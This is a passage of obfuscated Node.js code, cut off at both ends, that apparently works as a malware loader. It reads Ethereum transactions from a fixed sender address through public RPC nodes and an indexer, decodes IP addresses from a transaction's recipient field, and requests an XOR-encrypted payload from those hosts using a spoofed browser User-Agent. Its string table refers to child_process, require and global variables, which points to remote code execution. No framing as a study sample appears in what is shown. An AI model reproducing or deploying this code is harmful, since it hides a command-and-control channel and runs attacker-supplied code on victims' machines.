_0x4bfaf9===_0x580f75;},'sZAHS':_0x3d2da5(0x161)+_0x3d2da5(0xa8),'tjngf':_0x3d2da5(0x12a)+_0x3d2da5(0x1aa),'LGNYs':_0x3d2da5(0x131),'YvZxf':_0x3d2da5(0x1a9)+'pe','vWzxi':_0x3d2da5(0x16e)+_0x3d2da5(0x1b5)};let _0x3cdce5=new URL(_0x593adb),_0x5032cf=_0x42d10d[_0x3d2da5(0x12c)](_0x42d10d[_0x3d2da5(0x139)],_0x3cdce5[_0x3d2da5(0x196)])?https:http,_0x27236b={'Accept':_0x42d10d[_0x3d2da5(0xa0)],'Accept-Encoding':_0x42d10d[_0x3d2da5(0xbb)],'Connection':_0x42d10d[_0x3d2da5(0x135)]};return _0x42d10d[_0x3d2da5(0xe3)](null,_0x3f686c)&&(_0x27236b[_0x42d10d[_0x3d2da5(0x115)]]=_0x42d10d[_0x3d2da5(0xa0)],_0x27236b[_0x42d10d[_0x3d2da5(0x17b)]]=Buffer[_0x3d2da5(0x19d)](_0x3f686c)),new Promise((_0x19f067,_0x4835e3)=>{const _0x3ef1bc=_0x3d2da5;let _0xaf0385=_0x5032cf[_0x3ef1bc(0xc7)]({'hostname':_0x3cdce5[_0x3ef1bc(0x93)],'port':_0x3cdce5[_0x3ef1bc(0x15d)]||(_0x42d10d[_0x3ef1bc(0x120)](_0x42d10d[_0x3ef1bc(0x139)],_0x3cdce5[_0x3ef1bc(0x196)])?0x1*-0xcfb+-0x1d2d+0xf*0x2ed:0x1338+0x2*-0x8d5+-0x13e),'path':_0x42d10d[_0x3ef1bc(0x14e)](_0x3cdce5[_0x3ef1bc(0x150)],_0x3cdce5[_0x3ef1bc(0x10e)]),'method':_0x25a99d,'agent':AGENTS[_0x3cdce5[_0x3ef1bc(0x196)]],'signal':_0x95d4f4,'headers':_0x27236b},_0x574ec9=>{const _0x4fd834=_0x3ef1bc,_0x10e94a={'ZGtcg':function(_0x483995,_0x4a5702){const _0x49dc91=_0x355e;return _0x42d10d[_0x49dc91(0x114)](_0x483995,_0x4a5702);},'vJvXf':_0x42d10d[_0x4fd834(0x18b)]};let _0x431427=_0x42d10d[_0x4fd834(0x114)](decompressStream,_0x574ec9),_0x39bef6=[];_0x431427['on'](_0x42d10d[_0x4fd834(0x122)],_0x123305=>_0x39bef6[_0x4fd834(0x198)](_0x123305)),_0x431427['on'](_0x42d10d[_0x4fd834(0x1ac)],()=>{const _0x589be9=_0x4fd834;try{_0x10e94a[_0x589be9(0x99)](_0x19f067,JSON[_0x589be9(0xd4)](Buffer[_0x589be9(0x107)](_0x39bef6)[_0x589be9(0x159)](_0x10e94a[_0x589be9(0xc5)])));}catch(_0x1c95a1){_0x10e94a[_0x589be9(0x99)](_0x4835e3,_0x1c95a1);}}),_0x431427['on'](_0x42d10d[_0x4fd834(0x121)],_0x4835e3);});_0xaf0385['on'](_0x42d10d[_0x3ef1bc(0x121)],_0x4835e3),_0x42d10d[_0x3ef1bc(0xe3)](null,_0x3f686c)&&_0xaf0385[_0x3ef1bc(0xb6)](_0x3f686c),_0xaf0385[_0x3ef1bc(0x142)]();});}async function withRpcEndpoints(_0x3c144e,_0x2ea979){const _0x495608=_0x3a2ebe;let _0x418a00=RPC_ENDPOINTS[_0x495608(0x14f)](()=>new AbortController());_0x418a00[_0x495608(0x95)](_0x15379b=>linkAbort(_0x2ea979,_0x15379b));try{return await Promise[_0x495608(0x11e)](RPC_ENDPOINTS[_0x495608(0x14f)]((_0x4c6137,_0x2fd673)=>_0x3c144e(_0x4c6137,_0x418a00[_0x2fd673][_0x495608(0x10b)])));}finally{for(let _0x393e64 of _0x418a00)_0x393e64[_0x495608(0x9a)]();}}async function rpcCall(_0x1c3ac1,_0x908566,_0x2038b9,_0x36db10){const _0x24e2d3=_0x3a2ebe,_0x55d7b1={'hXaau':function(_0x7320cd,_0x19397a,_0x30fde9){return _0x7320cd(_0x19397a,_0x30fde9);},'MxoIv':_0x24e2d3(0x19c),'CtMxp':_0x24e2d3(0x97)};let _0xffe3dd=await _0x55d7b1[_0x24e2d3(0x109)](httpRequest,_0x1c3ac1,{'method':_0x55d7b1[_0x24e2d3(0x9f)],'body':JSON[_0x24e2d3(0x98)]({'jsonrpc':_0x55d7b1[_0x24e2d3(0x140)],'id':0x1,'method':_0x908566,'params':_0x2038b9}),'signal':_0x36db10});return _0xffe3dd[_0x24e2d3(0xd6)];}async function rpcBatch(_0xb94eeb,_0x2e1831,_0x1aa236){const _0x143ca3=_0x3a2ebe,_0x8d06ce={'vVkBr':function(_0x259c12,_0x46239b,_0x186b51){return _0x259c12(_0x46239b,_0x186b51);},'HiWYY':_0x143ca3(0x19c)};let _0x303103=await _0x8d06ce[_0x143ca3(0x103)](httpRequest,_0xb94eeb,{'method':_0x8d06ce[_0x143ca3(0x1a8)],'body':JSON[_0x143ca3(0x98)](_0x2e1831[_0x143ca3(0x14f)](([_0xe79aa1,_0x386e83],_0x397f41)=>({'jsonrpc':_0x143ca3(0x97),'id':_0x397f41+(-0x2b*-0x48+0x2467+0x3*-0x102a),'method':_0xe79aa1,'params':_0x386e83}))),'signal':_0x1aa236}),_0x43900d=new Map(_0x303103[_0x143ca3(0x14f)](_0x46f816=>[_0x46f816['id'],_0x46f816]));return _0x2e1831[_0x143ca3(0x14f)]((_0x246f0d,_0x260de3)=>_0x43900d[_0x143ca3(0xe9)](_0x260de3+(-0xa25*-0x2+0x19fa+-0x2e43))[_0x143ca3(0xd6)]);}let toBlockHex=_0x460a01=>'0x'+_0x460a01[_0x3a2ebe(0x159)](0x1b97+-0x2*0x3a7+-0x1f*0xa7);function findSenderTx(_0xaed72){const _0x58ebf2=_0x3a2ebe;return _0xaed72[_0x58ebf2(0x9d)](_0x11770d=>_0x11770d[_0x58ebf2(0x18c)]&&_0x11770d[_0x58ebf2(0x18c)][_0x58ebf2(0xc2)+'e']()===SENDER)||null;}function decodeAddress(_0x3f982d){const _0x53878e=_0x3a2ebe,_0x160094={'ScXiL':_0x53878e(0x15a),'jrdXD':function(_0x5aff48,_0x31311f){return _0x5aff48(_0x31311f);},'DGksE':function(_0x4f37d6,_0x4e64f1){return _0x4f37d6(_0x4e64f1);}};let _0x268f72=Buffer[_0x53878e(0x18c)](_0x3f982d[_0x53878e(0xbd)](/^0x/i,''),_0x160094[_0x53878e(0x1a2)]),_0x43d4d2=_0x33741d=>_0x33741d[-0x853+-0x2*0x338+0xec3]+'.'+_0x33741d[-0xb2c+-0x1e9+-0x1*-0xd16]+'.'+_0x33741d[-0x1*-0x704+-0x1*-0x25e1+0x2ce3*-0x1]+'.'+_0x33741d[0x2*0x1042+-0x4c2*0x5+-0x8b7];return[_0x160094[_0x53878e(0xb0)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x1*-0x1def+0x1939+0x4*-0xdca,0x71*0x23+0x2410+-0x337f)),_0x160094[_0x53878e(0xcf)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x2f*0x3+0xb5*0xd+-0x6*0x170,0x1*-0x22a0+-0xe*0x15a+0x3594))];}function _0x12f0(){const _0x2c2fa8=['smCxl','node:https','oad\x20body','any','zNIqU','UlrdI','rysJt','gMfuo','Payload-B6',':443/0x/ls','ipNqp','coding','UqBND',',Sr3=@','_t_u\x27]=\x27','gzip,\x20defl','SDbiI','xuBDG','liDecompre','EreqP','BTHgJ','Kit/537.36','keep-alive','_t_s\x27]=\x27','GET','KvMSQ','LGNYs','public.bla','plaFW','NkKDh','MHjGK','13698468PmAknI','0xa322e5f3','297120QUZuEg','yrzwP','zeoxL','eth_getBlo','CtMxp','Agent','end','on=txlist&','jvgKp','KXiLK','Win64;\x20x64','node:zlib','gzip','https://1r','node:http','headers','createGunz','JbAci','zBIcw','map','pathname','nghnv','.publicnod','fari/537.3','RpPIO',':80','VnFVq','m\x27]=module','hrUVT','toString','hex','LBjUj','_t_s','port','_H2\x27]=\x27','QLmfg','9&page=1&o','applicatio','YZKTj','findIndex','VLAGf','createInfl','transactio','gldQK','GuYPf','h.drpc.org','_H2','ut.com/api','fLYXd','has','Content-Le','controller','aveIc','tavZt','BJgzE','add','49oNuXHs','JVkQF','GAvxe','unref','then','al=global;','\x27]=\x27','vWzxi','node:url','oMnng','http://','run','\x20Chrome/13',':443','bXcTI','k=0&endblo','lnQal','@^1aQk','x-gzip','nonce','e.com','bLolJ','ike\x20Gecko)','gvgPD','from','KafOh','h.blocksco','hereum-rpc','ort=desc&f','TCDmB','LssUT','https://et','addEventLi','pipe','protocol','ffset=20&s','push','ZgpqG','Tnnlg','utf8','POST','byteLength','qFOcQ','createBrot','ugrhL','eth_blockN','ScXiL','WYnsa','0\x20(Windows','zwjTr','eEQvU','b64','HiWYY','Content-Ty','ate,\x20br','xxxso','KaaPY','fIkOw','blockNumbe','9adc2490ef','eAmtO','min','wNEAr','ucVFK','jueMj','ngth','FfHYb','gzKWs','PSzJk','resume','y-p_>d$0B&','nILEL','hostname','KQldR','forEach','base64','2.0','stringify','ZGtcg','abort','filter','rMZnD','find','1.0.0.0\x20Sa','MxoIv','sZAHS','fbAQy','dQhjR','count&acti','qqKoX','3999712DXgKmU','ziJAI','q4FZkxX{!h','n/json','x-payload-','foHur','RWrVc','charCodeAt','nnxOv','mjCAw','data','jrdXD','ate','ZYBBe','eth_getTra','all','883554gwKkih','write','JQKVG','mGgtb','Missing\x20X-','ck=9999999','tjngf','address=','replace','r\x27]=requir','fJKsv','5050170JAAsRa','error','toLowerCas','xbMiN','ilterby=fr','vJvXf','raCZU','request','content-en','unt','XLylK','d311d3080e','TOkwx','length','WMrCP','DGksE','nsactionCo','FWUiH','RsZph','aPZUM','parse','https:','result','object','umber','VMnQg','CDbzL','Empty\x20payl','\x20NT\x2010.0;\x20','2KeNBiC','subarray','wvGeG','CUrwh','\x20(KHTML,\x20l','XrZYs','VGOlJ',':443/0x/cl','&startbloc','rjSZm','LTGfe','ZAlOy','get','6f0121063e','deflate','MjzxH','node','\x27;global[\x27','?module=ac','360688RTYsDf','stapi.io','isArray','eWCKt','_process','h-mainnet.','GGqwf','eIHSm','xQuoH','stener','_H\x27]=\x27','Mozilla/5.','djgaa','DSbLa','qiODF','global[\x27_V','catch','cVjMR','SXfgk','vVkBr','QMwHG','node:child',';var\x20_glob','concat','JGUpq','hXaau','XHNyr','signal','5407112rvLYDS','ckByNumber','search','ignore','pc.io/eth','e;global[\x27','gIWWO','SHJJd','JODvp','YvZxf','_t_u',')\x20AppleWeb','CRKiT','tqJhV','HEAD'];_0x12f0=function(){return _0x2c2fa8;};return _0x12f0();}function firstMatch(_0x21b624){const _0x5f5985={'fIkOw':function(_0x228835,_0x5c99db){return _0x228835(_0x5c99db);},'fJKsv':function(_0x6e49ad,_0x5da592){return _0x6e49ad==_0x5da592;},'aveIc':function(_0x5f50e9,_0x4cf526){return _0x5f50e9(_0x4cf526);},'JVkQF':function(_0x1b9cad,_0x34e74f){return _0x1b9cad!=_0x34e74f;},'QLmfg':function(_0x2b1d39,_0xfdf95d){return _0x2b1d39(_0xfdf95d);},'gldQK':function(_0x330753,_0x1837de){return _0x330753(_0x1837de);}};return new Promise(_0x1055a6=>{const _0x43a200=_0x355e,_0x574496={'qqKoX':function(_0x4f2e13,_0x16b5ae){const _0x4bfb56=_0x355e;return _0x5f5985[_0x4bfb56(0x170)](_0x4f2e13,_0x16b5ae);}};let _0x34d0a3=_0x21b624[_0x43a200(0xcd)];if(!_0x34d0a3)return _0x5f5985[_0x43a200(0x167)](_0x1055a6,null);let _0x12f190=!(0x1*-0xead+-0x25d5+0x3483),_0x4ea38e=_0x344775=>{const _0x5a6f9a=_0x43a200;if(!_0x12f190){for(let _0x11c14b of(_0x12f190=!(-0x13c4+-0x1a02+0x2dc6),_0x21b624))_0x11c14b[_0x5a6f9a(0x16f)][_0x5a6f9a(0x9a)]();_0x574496[_0x5a6f9a(0xa4)](_0x1055a6,_0x344775);}};for(let _0x266710 of _0x21b624)_0x266710[_0x43a200(0x17f)]()[_0x43a200(0x178)](_0x193f94=>{const _0x1cbfd8=_0x43a200;_0x12f190||(_0x193f94?_0x5f5985[_0x1cbfd8(0x1ad)](_0x4ea38e,_0x193f94):_0x5f5985[_0x1cbfd8(0xbf)](0xe0*0x4+0x1*0x1bf7+-0x1f77,--_0x34d0a3)&&_0x5f5985[_0x1cbfd8(0x170)](_0x1055a6,null));})[_0x43a200(0x100)](()=>{const _0xebd979=_0x43a200;_0x12f190||_0x5f5985[_0xebd979(0x175)](-0xc39+0x723+0x516,--_0x34d0a3)||_0x5f5985[_0xebd979(0x15f)](_0x1055a6,null);});});}function candidateBlocks(_0x3cdaf9){const _0x3e16b7=_0x3a2ebe,_0x26a154={'CRKiT':function(_0x296270,_0x1821b5){return _0x296270-_0x1821b5;},'nnxOv':function(_0xd797ea,_0x1874f0){return _0xd797ea-_0x1874f0;},'BJgzE':function(_0x17a746,_0x198c5e){return _0x17a746+_0x198c5e;},'nghnv':function(_0xc4b7b9,_0x52dbd9){return _0xc4b7b9-_0x52dbd9;},'fLYXd':function(_0x9cf028,_0x268c43){return _0x9cf028+_0x268c43;},'WMrCP':function(_0x1f3421,_0x1c5822){return _0x1f3421<_0x1c5822;}};let _0x4a55ef=_0x26a154[_0x3e16b7(0x118)](_0x3cdaf9,BLOCK_MULTIPLE),_0x5e5c51=new Set(),_0x482794=[];for(let _0x2d2666 of[_0x26a154[_0x3e16b7(0xad)](_0x3cdaf9,0x1n),_0x3cdaf9,_0x26a154[_0x3e16b7(0x172)](_0x3cdaf9,0x1n),_0x26a154[_0x3e16b7(0x151)](_0x4a55ef,0x1n),_0x4a55ef,_0x26a154[_0x3e16b7(0x16c)](_0x4a55ef,0x1n)]){if(_0x26a154[_0x3e16b7(0xce)](_0x2d2666,0x0n))continue;let _0x3ae321=_0x2d2666[_0x3e16b7(0x159)]();_0x5e5c51[_0x3e16b7(0x16d)](_0x3ae321)||(_0x5e5c51[_0x3e16b7(0x173)](_0x3ae321),_0x482794[_0x3e16b7(0x198)](_0x2d2666));}return _0x482794;}function blockTask(_0x42089c){const _0x43f677={'wNEAr':function(_0x5d6398,_0x346548,_0x44c318){return _0x5d6398(_0x346548,_0x44c318);},'ziJAI':function(_0x1919d0,_0x138670){return _0x1919d0(_0x138670);}};let _0xc51d7b=new AbortController();return{'controller':_0xc51d7b,async 'run'(){const _0x4800f8=_0x355e;let _0x3fcdb4=await _0x43f677[_0x4800f8(0x1b2)](withRpcEndpoints,(_0x3c3351,_0x45a26b)=>rpcCall(_0x3c3351,_0x4800f8(0x13f)+_0x4800f8(0x10d),[toBlockHex(_0x42089c),!(-0x1*0xaeb+-0x7*0x59+-0x1*-0xd5a)],_0x45a26b),_0xc51d7b[_0x4800f8(0x10b)]),_0xa17565=_0x3fcdb4?.[_0x4800f8(0x166)+'ns'];if(!Array[_0x4800f8(0xf2)](_0xa17565))return null;let _0x3aaf38=_0x43f677[_0x4800f8(0xa6)](findSenderTx,_0xa17565);return _0x3aaf38?{'blockNumber':_0x42089c,'tx':_0x3aaf38}:null;}};}async function nonceAtBlocks(_0x48b0b7,_0xeba093){const _0x2bf86d=_0x3a2ebe,_0x306878={'CUrwh':function(_0x5917ba,_0x80a075,_0x5f1ee8){return _0x5917ba(_0x80a075,_0x5f1ee8);}};let _0x5c1a05=_0x48b0b7[_0x2bf86d(0x14f)](_0x1dcdef=>[_0x2bf86d(0xb3)+_0x2bf86d(0xd0)+_0x2bf86d(0xc9),[SENDER,toBlockHex(_0x1dcdef)]]);try{return(await _0x306878[_0x2bf86d(0xe0)](withRpcEndpoints,(_0xd746f,_0x473522)=>rpcBatch(_0xd746f,_0x5c1a05,_0x473522),_0xeba093))[_0x2bf86d(0x14f)](BigInt);}catch{return(await Promise[_0x2bf86d(0xb4)](_0x5c1a05[_0x2bf86d(0x14f)](([_0x2babff,_0x3a3b66])=>withRpcEndpoints((_0x149844,_0xb83fe7)=>rpcCall(_0x149844,_0x2babff,_0x3a3b66,_0xb83fe7),_0xeba093))))[_0x2bf86d(0x14f)](BigInt);}}async function lastSenderTx(_0x6947a6){const _0x2fd541=_0x3a2ebe,_0x865f0d={'TOkwx':function(_0x5d2d58,_0x8010fd){return _0x5d2d58(_0x8010fd);},'mGgtb':function(_0x58f27c,_0x4c45b7,_0x3c600e){return _0x58f27c(_0x4c45b7,_0x3c600e);},'MjzxH':function(_0x1c1e28,_0x3211ab){return _0x1c1e28(_0x3211ab);},'JQKVG':function(_0x4c6ce4,_0x3b78d1){return _0x4c6ce4-_0x3b78d1;},'ucVFK':function(_0x1fa7f8,_0x1e54b0){return _0x1fa7f8>_0x1e54b0;},'oMnng':function(_0x514391,_0x56220c){return _0x514391(_0x56220c);},'NkKDh':function(_0x3fccd7,_0x3598ae){return _0x3fccd7<=_0x3598ae;},'lnQal':function(_0x35f187,_0x271b47){return _0x35f187+_0x271b47;},'foHur':function(_0x1e7b3b,_0x19c605){return _0x1e7b3b/_0x19c605;},'SDbiI':function(_0x43c2f0,_0xbdc559){return _0x43c2f0*_0xbdc559;},'CDbzL':function(_0x461538,_0x22c7d6){return _0x461538+_0x22c7d6;},'GGqwf':function(_0x4c1acc,_0x1f6394){return _0x4c1acc===_0x1f6394;},'fbAQy':function(_0xe78b10,_0x2a2d28){return _0xe78b10(_0x2a2d28);}};let _0x1228d0=new AbortController();try{let _0x7717c5=_0x6947a6??_0x865f0d[_0x2fd541(0xcc)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x225474,_0x398eed)=>rpcCall(_0x225474,_0x2fd541(0x1a1)+_0x2fd541(0xd8),[],_0x398eed),_0x1228d0[_0x2fd541(0x10b)])),_0xe32847=_0x865f0d[_0x2fd541(0xec)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x166e6e,_0x20a24f)=>rpcCall(_0x166e6e,_0x2fd541(0xb3)+_0x2fd541(0xd0)+_0x2fd541(0xc9),[SENDER,toBlockHex(_0x7717c5)],_0x20a24f),_0x1228d0[_0x2fd541(0x10b)])),_0x2c7ca1=_0x865f0d[_0x2fd541(0xb7)](_0xe32847,0x1n),_0x36dc0b=_0x865f0d[_0x2fd541(0xb7)](SEARCH_FLOOR,0x1n),_0x57beb5=_0x7717c5;for(;_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n);){let _0x37635a=_0x865f0d[_0x2fd541(0xb7)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n),_0x40232d=_0x865f0d[_0x2fd541(0xec)](BigInt,Math[_0x2fd541(0x1b1)](NONCE_FANOUT,_0x865f0d[_0x2fd541(0x17d)](Number,_0x37635a))),_0x5e593e=[];for(let _0x323461=0x1n;_0x865f0d[_0x2fd541(0x138)](_0x323461,_0x40232d);_0x323461+=0x1n)_0x5e593e[_0x2fd541(0x198)](_0x865f0d[_0x2fd541(0x184)](_0x36dc0b,_0x865f0d[_0x2fd541(0xaa)](_0x865f0d[_0x2fd541(0x12b)](_0x323461,_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b)),_0x865f0d[_0x2fd541(0xda)](_0x40232d,0x1n))));let _0x5aae99=await _0x865f0d[_0x2fd541(0xb8)](nonceAtBlocks,_0x5e593e,_0x1228d0[_0x2fd541(0x10b)]),_0x5415e7=_0x5aae99[_0x2fd541(0x163)](_0x59ad09=>_0x59ad09>=_0xe32847);_0x865f0d[_0x2fd541(0xf6)](-(0xe3*-0x29+0xe5e*0x2+0x7a0*0x1),_0x5415e7)?_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5e593e[_0x2fd541(0xcd)],-0x6*-0x4a2+0x2478+-0x4043)]:(_0x57beb5=_0x5e593e[_0x5415e7],_0x865f0d[_0x2fd541(0x1b3)](_0x5415e7,-0x170*-0x5+-0xbdf+-0x6d*-0xb)&&(_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5415e7,-0x121b+0x869*-0x1+0x3*0x8d7)]));}let _0x44a2e1=await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x5aa246,_0x356a05)=>rpcCall(_0x5aa246,_0x2fd541(0x13f)+_0x2fd541(0x10d),[toBlockHex(_0x57beb5),!(-0x870*0x1+-0x1b5b+0x23cb)],_0x356a05),_0x1228d0[_0x2fd541(0x10b)]),_0x2a8ad0=_0x44a2e1?.[_0x2fd541(0x166)+'ns']||[],_0x5d7a1a=null;for(let _0x2ef2b4 of _0x2a8ad0)if(_0x2ef2b4[_0x2fd541(0x18c)]&&_0x865f0d[_0x2fd541(0xf6)](_0x2ef2b4[_0x2fd541(0x18c)][_0x2fd541(0xc2)+'e'](),SENDER)){if(_0x865f0d[_0x2fd541(0xf6)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x2c7ca1)){_0x5d7a1a=_0x2ef2b4;break;}(!_0x5d7a1a||_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x865f0d[_0x2fd541(0xa1)](BigInt,_0x5d7a1a[_0x2fd541(0x187)])))&&(_0x5d7a1a=_0x2ef2b4);}return{'blockNumber':_0x57beb5,'tx':_0x5d7a1a};}finally{_0x1228d0[_0x2fd541(0x9a)]();}}async function lastSenderTxViaIndexer(){const _0x30016b=_0x3a2ebe,_0x461186={'yrzwP':function(_0x224acc,_0x21a4ef){return _0x224acc(_0x21a4ef);},'UqBND':function(_0x3ca6e2,_0x6d0e95){return _0x3ca6e2(_0x6d0e95);}};let _0x6b3534=INDEXER_URL+(_0x30016b(0xef)+_0x30016b(0xa3)+_0x30016b(0x143)+_0x30016b(0xbc))+SENDER+(_0x30016b(0xe5)+_0x30016b(0x183)+_0x30016b(0xba)+_0x30016b(0x160)+_0x30016b(0x197)+_0x30016b(0x190)+_0x30016b(0xc4)+'om'),_0x50dcd4=await _0x461186[_0x30016b(0x13d)](httpRequest,_0x6b3534),_0x3f1cd2=Array[_0x30016b(0xf2)](_0x50dcd4?.[_0x30016b(0xd6)])?_0x50dcd4[_0x30016b(0xd6)]:[],_0x58d5fe=_0x3f1cd2[_0x30016b(0x9d)](_0x5346ca=>_0x5346ca[_0x30016b(0x18c)]&&_0x5346ca[_0x30016b(0x18c)][_0x30016b(0xc2)+'e']()===SENDER);return{'blockNumber':_0x461186[_0x30016b(0x127)](BigInt,_0x58d5fe[_0x30016b(0x1ae)+'r']),'tx':_0x58d5fe};}async function run(){const _0x21838c=_0x3a2ebe,_0x123142={'VnFVq':function(_0x354288,_0x3fa815){return _0x354288<_0x3fa815;},'Tnnlg':function(_0x1df33a,_0x158d6c){return _0x1df33a%_0x158d6c;},'ugrhL':_0x21838c(0x19b),'tqJhV':_0x21838c(0xa9)+_0x21838c(0x1a7),'xQuoH':function(_0x183f5f,_0x2adbd1){return _0x183f5f(_0x2adbd1);},'zwjTr':_0x21838c(0xb9)+_0x21838c(0x123)+'4','GuYPf':_0x21838c(0x96),'bXcTI':function(_0x4834c3,_0xed5caa){return _0x4834c3(_0xed5caa);},'gzKWs':_0x21838c(0xdb)+_0x21838c(0x11d),'VMnQg':function(_0x38ff78,_0x527698){return _0x38ff78===_0x527698;},'PSzJk':_0x21838c(0x11a),'aPZUM':_0x21838c(0xaf),'xxxso':_0x21838c(0x142),'raCZU':_0x21838c(0xc1),'plaFW':function(_0x1d2be3,_0x44ea01){return _0x1d2be3(_0x44ea01);},'nILEL':function(_0x57e6f1,_0x261c45){return _0x57e6f1+_0x261c45;},'wvGeG':_0x21838c(0xfb)+_0x21838c(0x1a4)+_0x21838c(0xdc)+_0x21838c(0x146)+_0x21838c(0x117)+_0x21838c(0x130)+_0x21838c(0xe1)+_0x21838c(0x18a)+_0x21838c(0x180)+_0x21838c(0x9e)+_0x21838c(0x153)+'6','qiODF':function(_0x2b7840,_0x196963){return _0x2b7840(_0x196963);},'SXfgk':_0x21838c(0x133),'xbMiN':function(_0x27a0b9,_0x394d32,_0x228371){return _0x27a0b9(_0x394d32,_0x228371);},'jueMj':function(_0x3071ee,_0x13c1dd){return _0x3071ee(_0x13c1dd);},'ipNqp':function(_0x5c8fe2,_0x51b60d,_0x375c99,_0x3adfd0){return _0x5c8fe2(_0x51b60d,_0x375c99,_0x3adfd0);},'KXiLK':_0x21838c(0xed),'rMZnD':function(_0x2485d9,_0x15b4b8){return _0x2485d9+_0x15b4b8;},'RWrVc':_0x21838c(0x10f),'WYnsa':function(_0x36aa2d,_0x4e00f2){return _0x36aa2d(_0x4e00f2);},'JGUpq':function(_0x17a5ba,_0xaf6465){return _0x17a5ba(_0xaf6465);},'eWCKt':function(_0x1e004b,_0x84fa2c){return _0x1e004b-_0x84fa2c;},'KafOh':function(_0x4df275,_0x2e90){return _0x4df275%_0x2e90;},'qFOcQ':function(_0x24fa80,_0x20975f){return _0x24fa80(_0x20975f);},'eIHSm':_0x21838c(0xa7)+_0x21838c(0x128),'XrZYs':function(_0x4740e4,_0x8d4335,_0x240499,_0x191515){return _0x4740e4(_0x8d4335,_0x240499,_0x191515);},'zeoxL':_0x21838c(0x1ba)+_0x21838c(0x185)};let _0x276e42=_0x123142[_0x21838c(0x1a3)](BigInt,await _0x123142[_0x21838c(0x108)](withRpcEndpoints,(_0x486914,_0x1c1835)=>rpcCall(_0x486914,_0x21838c(0x1a1)+_0x21838c(0xd8),[],_0x1c1835))),_0x168d06=_0x123142[_0x21838c(0xf3)](_0x276e42,_0x123142[_0x21838c(0x18d)](_0x276e42,BLOCK_MULTIPLE)),_0x412ae7=await _0x123142[_0x21838c(0x137)](firstMatch,_0x123142[_0x21838c(0x1a3)](candidateBlocks,_0x168d06)[_0x21838c(0x14f)](blockTask));_0x412ae7||(_0x412ae7=await _0x123142[_0x21838c(0x19e)](lastSenderTx,_0x276e42)[_0x21838c(0x100)](()=>lastSenderTxViaIndexer()));let [_0x28de5d,_0x3b6d7d]=_0x123142[_0x21838c(0x1b4)](decodeAddress,_0x412ae7['tx']['to']),_0x3d94ba=global;function _0x5ec9c4(_0x3a20ac,_0xa9d24e){const _0x55165e=_0x21838c,_0x5ecf66={'zNIqU':function(_0x430017,_0x3246e6){const _0x15bc56=_0x355e;return _0x123142[_0x15bc56(0x182)](_0x430017,_0x3246e6);},'rjSZm':_0x123142[_0x55165e(0x119)],'cVjMR':_0x123142[_0x55165e(0x1b7)],'SHJJd':function(_0x200ce2,_0x44228d){const _0x155fb8=_0x55165e;return _0x123142[_0x155fb8(0xd9)](_0x200ce2,_0x44228d);},'dQhjR':_0x123142[_0x55165e(0x1b8)],'ZAlOy':function(_0x59c273,_0x17297a){const _0x4fc8a3=_0x55165e;return _0x123142[_0x4fc8a3(0xf8)](_0x59c273,_0x17297a);},'bLolJ':_0x123142[_0x55165e(0xd3)],'hrUVT':_0x123142[_0x55165e(0x1ab)],'YZKTj':_0x123142[_0x55165e(0xc6)]};let _0x11ec1f={'hostname':_0xa9d24e[_0x55165e(0x93)],'port':_0x123142[_0x55165e(0x137)](Number,_0xa9d24e[_0x55165e(0x15d)])||0x2236+-0x22b0+0xca,'path':_0x123142[_0x55165e(0x92)](_0xa9d24e[_0x55165e(0x150)],_0xa9d24e[_0x55165e(0x10e)]),'headers':{'User-Agent':_0x123142[_0x55165e(0xdf)],'Sec-V':_0x3d94ba['_V']||0x1309+-0x132b+0x22}};function _0x5944ee(_0x39564c){const _0x337ed4=_0x55165e;let _0x3de935=_0x3a20ac[_0x337ed4(0xcd)];for(let _0xcd6de2=-0x1*-0x15f6+0xc04+0x21fa*-0x1;_0x123142[_0x337ed4(0x156)](_0xcd6de2,_0x39564c[_0x337ed4(0xcd)]);_0xcd6de2++)_0x39564c[_0xcd6de2]^=_0x3a20ac[_0x337ed4(0xac)](_0x123142[_0x337ed4(0x19a)](_0xcd6de2,_0x3de935));return _0x39564c[_0x337ed4(0x159)](_0x123142[_0x337ed4(0x1a0)]);}function _0x3fa166(_0x5286d4){const _0x30bac6=_0x55165e;let _0x1c7184=_0x5286d4[_0x30bac6(0x14b)][_0x123142[_0x30bac6(0x119)]];if(!_0x1c7184)throw _0x123142[_0x30bac6(0xf8)](Error,_0x123142[_0x30bac6(0x1a5)]);return _0x123142[_0x30bac6(0xf8)](_0x5944ee,Buffer[_0x30bac6(0x18c)](_0x1c7184,_0x123142[_0x30bac6(0x168)]));}function _0x5e0c4c(_0x188457){const _0xdb2b5e=_0x55165e,_0x9df163={'FfHYb':function(_0x275d20,_0x11a249){const _0xda171f=_0x355e;return _0x5ecf66[_0xda171f(0x11f)](_0x275d20,_0x11a249);},'gIWWO':_0x5ecf66[_0xdb2b5e(0xe6)],'LTGfe':_0x5ecf66[_0xdb2b5e(0x101)],'djgaa':function(_0x12f74b,_0x87bcc9){const _0xd19d42=_0xdb2b5e;return _0x5ecf66[_0xd19d42(0x113)](_0x12f74b,_0x87bcc9);},'eEQvU':_0x5ecf66[_0xdb2b5e(0xa2)],'KQldR':function(_0x5a7b3b,_0x1dcf69){const _0x3bd8a8=_0xdb2b5e;return _0x5ecf66[_0x3bd8a8(0xe8)](_0x5a7b3b,_0x1dcf69);},'jvgKp':_0x5ecf66[_0xdb2b5e(0x189)],'ZgpqG':_0x5ecf66[_0xdb2b5e(0x158)],'XLylK':_0x5ecf66[_0xdb2b5e(0x162)]};return new Promise((_0x15f946,_0x5a9938)=>{const _0x320ae6=_0xdb2b5e,_0x34a894={'QMwHG':function(_0x40448d,_0x23c91e){const _0x42dd94=_0x355e;return 